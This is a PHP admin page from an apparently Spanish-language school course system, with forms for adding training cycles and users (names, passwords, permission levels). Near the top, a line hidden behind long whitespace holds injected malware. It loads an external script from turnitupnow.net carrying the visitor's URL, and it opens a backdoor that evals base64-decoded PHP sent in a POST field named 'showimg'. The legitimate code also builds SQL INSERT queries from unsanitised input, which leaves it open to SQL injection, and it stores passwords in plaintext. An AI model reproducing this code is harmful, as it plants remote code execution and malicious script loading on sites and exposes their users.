<link href="resources/estilos.css" rel="stylesheet" type="text/css">

<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }
 if (isset($_GET['guardarciclo'])) { $result = $db->Execute("INSERT INTO CDE_cicleform (idf, cicle, codi, duracio) VALUES ('$idf', '$cicle', '$codi', '$duracio')"); } ?>

<?php if (isset($_GET['guardaruser'])) { $result = $db->Execute("INSERT INTO usuarios (nombre, pass, nivel) VALUES ('$nombre', '$pass', '$nivel')"); } ?>

				  <form id="form1" name="form1" method="post" action="index.php?menu=3&sub=3&guardarciclo" style="margin:0px">
                    <table width="290" border="0" align="center" cellpadding="0" cellspacing="0">
                      <tr>
                        <td height="22" bgcolor="#000000" class="texte_normal_blanco">&nbsp;&nbsp;Añadir nuevo Ciclo</td>
                      </tr>
                    </table>
                    <table width="290" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Familia</td>
                        <td bgcolor="#F8F8F8"><label>
                        <select name="idf" class="texte_normal" id="idf">
                        
                        <?php  $result = $db->Execute("SELECT * FROM CDE_famciclos ORDER BY id DESC"); 
								while (!$result->EOF) {

								$id = $result->fields[0];
								$nombre = $result->fields[1];
								$nombre = substr($nombre,0,25);
						?>
                        
                          <option value="<?php echo $id ?>"><?php echo htmlentities($nombre)."..." ?></option>
                          
                        <?php
						$result->MoveNext();
						}	 
						?>  
                          
                        </select>
                        </label></td>
                      </tr>
                      <tr>
                        <td width="120" height="22" bgcolor="#F8F8F8">&nbsp;Ciclo</td>
                        <td width="170" bgcolor="#F8F8F8"><label>
                          <input name="cicle" type="text" class="texte_normal" id="cicle" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Codigo</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="codi" type="text" class="texte_normal" id="codi" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Horas</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="duracio" type="text" class="texte_normal" id="textfield2" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="26" bgcolor="#F8F8F8">&nbsp;</td>
                        <td align="left" bgcolor="#F8F8F8"><label>
                          <input name="button" type="submit" class="texte_normal" id="button" value="Guardar" />
                        </label></td>
                      </tr>
                    </table>
                  </form>
                   <br />
                  
                  <form id="form1" name="form1" method="post" action="index.php?menu=3&sub=3&guardaruser" style="margin:0px">
                    <table width="290" border="0" align="center" cellpadding="0" cellspacing="0">
                      <tr>
                        <td height="22" bgcolor="#000000" class="texte_normal_blanco">&nbsp;&nbsp;Añadir nuevo Usuario</td>
                      </tr>
                    </table>
                                    <table width="290" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                                      <tr>
                                        <td width="120" height="22" bgcolor="#F8F8F8">&nbsp;Nombre</td>
                                        <td width="170" bgcolor="#F8F8F8"><label>
                                          <input name="nombre" type="text" class="texte_normal" id="nombre" />
                                        </label></td>
                                      </tr>
                                      <tr>
                                        <td height="22" bgcolor="#F8F8F8">&nbsp;Contraseña</td>
                                        <td bgcolor="#F8F8F8"><input name="pass" type="text" class="texte_normal" id="textfield10" /></td>
                                      </tr>
                                      <tr>
                                        <td height="22" bgcolor="#F8F8F8">&nbsp;Permisos</td>
                                        <td bgcolor="#F8F8F8"><label>
                                          <select name="nivel" class="texte_normal" id="nivel">
                                            <option value="1">Admin</option>
                                            <option value="3">Jefe Dpt</option>
                                            <option value="5">Profesor</option>
                                        </select>
                                        </label></td>
                                      </tr>

                                      <tr>
                                        <td height="26" bgcolor="#F8F8F8">&nbsp;</td>
                                        <td align="left" bgcolor="#F8F8F8"><label>
                                          <input name="button" type="submit" class="texte_normal" id="button" value="Guardar" />
                                        </label></td>
                                      </tr>
                                    </table>
                  </form>